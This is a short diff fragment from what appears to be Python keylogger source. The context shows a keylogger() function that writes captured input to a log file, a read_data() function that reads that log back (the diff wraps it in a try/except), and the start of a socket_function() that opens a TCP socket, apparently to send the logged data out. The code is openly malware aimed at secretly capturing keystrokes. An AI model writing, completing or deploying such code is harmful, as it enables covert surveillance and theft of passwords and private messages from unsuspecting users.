@@ -30,9 +30,13 @@ def keylogger():
             f.write("\n{}".format(msg))
 
 def read_data():
-    fd=open("log_file","r")
-    data=fd.read()
-    return data
+    try:
+        fd=open("log_file","r")
+    except:
+        pass
+    else:
+        data=fd.read()
+        return data
 
 def socket_function():
     sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
